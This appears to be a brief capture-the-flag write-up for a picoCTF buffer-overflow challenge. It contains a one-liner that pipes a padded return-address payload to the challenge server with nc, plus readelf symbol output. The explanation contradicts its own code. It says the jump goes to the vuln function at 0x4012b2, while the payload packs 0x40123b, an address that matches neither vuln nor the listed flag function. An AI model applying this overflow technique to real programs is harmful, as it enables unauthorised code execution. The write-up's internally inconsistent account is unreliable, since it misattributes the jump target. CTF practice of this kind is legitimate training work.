This tiny buffer overflow can be solved by this Python oneliner:

```bash
python3 -c 'import struct; print("A"*72 + struct.pack("<I", 0x000000000040123b).decode("utf8"))'  | nc saturn.picoctf.net 52476
```

But why?

First we have to find address of *vuln* function, that we have to force the program to jump to:

```console
[user@host x-sixty-what]$ readelf -s  vuln | grep FUN
     1: 0000000000000000     0 FUNC    GLOBAL DEFAULT  UND puts@GLIBC_2.2.5 (2)
     2: 0000000000000000     0 FUNC    GLOBAL DEFAULT  UND [...]@GLIBC_2.2.5 (2)
     3: 0000000000000000     0 FUNC    GLOBAL DEFAULT  UND [...]@GLIBC_2.2.5 (2)
     4: 0000000000000000     0 FUNC    GLOBAL DEFAULT  UND [...]@GLIBC_2.2.5 (2)
     5: 0000000000000000     0 FUNC    GLOBAL DEFAULT  UND fgets@GLIBC_2.2.5 (2)
     7: 0000000000000000     0 FUNC    GLOBAL DEFAULT  UND gets@GLIBC_2.2.5 (2)
     8: 0000000000000000     0 FUNC    GLOBAL DEFAULT  UND [...]@GLIBC_2.2.5 (2)
     9: 0000000000000000     0 FUNC    GLOBAL DEFAULT  UND [...]@GLIBC_2.2.5 (2)
    10: 0000000000000000     0 FUNC    GLOBAL DEFAULT  UND fopen@GLIBC_2.2.5 (2)
    11: 0000000000000000     0 FUNC    GLOBAL DEFAULT  UND exit@GLIBC_2.2.5 (2)
    29: 0000000000401190     0 FUNC    LOCAL  DEFAULT   15 deregister_tm_clones
    30: 00000000004011c0     0 FUNC    LOCAL  DEFAULT   15 register_tm_clones
    31: 0000000000401200     0 FUNC    LOCAL  DEFAULT   15 __do_global_dtors_aux
    34: 0000000000401230     0 FUNC    LOCAL  DEFAULT   15 frame_dummy
    45: 00000000004013b0     5 FUNC    GLOBAL DEFAULT   15 __libc_csu_fini
    48: 0000000000000000     0 FUNC    GLOBAL DEFAULT  UND puts@@GLIBC_2.2.5
    49: 00000000004012b2    32 FUNC    GLOBAL DEFAULT   15 vuln
    51: 00000000004013b8     0 FUNC    GLOBAL HIDDEN    16 _fini
    52: 0000000000000000     0 FUNC    GLOBAL DEFAULT  UND setresgid@@GLIBC[...]
    53: 0000000000000000     0 FUNC    GLOBAL DEFAULT  UND printf@@GLIBC_2.2.5
    54: 0000000000000000     0 FUNC    GLOBAL DEFAULT  UND __libc_start_mai[...]
    55: 0000000000000000     0 FUNC    GLOBAL DEFAULT  UND fgets@@GLIBC_2.2.5
    60: 0000000000000000     0 FUNC    GLOBAL DEFAULT  UND gets@@GLIBC_2.2.5
    61: 0000000000401340   101 FUNC    GLOBAL DEFAULT   15 __libc_csu_init
    63: 0000000000401180     5 FUNC    GLOBAL HIDDEN    15 _dl_relocate_sta[...]
    64: 0000000000401150    47 FUNC    GLOBAL DEFAULT   15 _start
    65: 0000000000000000     0 FUNC    GLOBAL DEFAULT  UND getegid@@GLIBC_2.2.5
    67: 00000000004012d2   109 FUNC    GLOBAL DEFAULT   15 main
    68: 0000000000000000     0 FUNC    GLOBAL DEFAULT  UND setvbuf@@GLIBC_2.2.5
    69: 0000000000000000     0 FUNC    GLOBAL DEFAULT  UND fopen@@GLIBC_2.2.5
    70: 0000000000000000     0 FUNC    GLOBAL DEFAULT  UND exit@@GLIBC_2.2.5
    72: 0000000000401236   124 FUNC    GLOBAL DEFAULT   15 flag
    73: 0000000000401000     0 FUNC    GLOBAL HIDDEN    12 _init
```

It is **00000000004012b2**, we use it in Python in this part:
```python
struct.pack("<I", 0x000000000040123b).decode("utf8")
```
To get the address in a form, that can be send through input. And what about those "A"s? That's just string of precise length to inject *vunl* function address on the stack. It is quite easy to guess that by modifying its length and checking the *dmesg* errors. This process is greatly explained in this video: https://www.youtube.com/watch?v=YVlTDPhTA9U
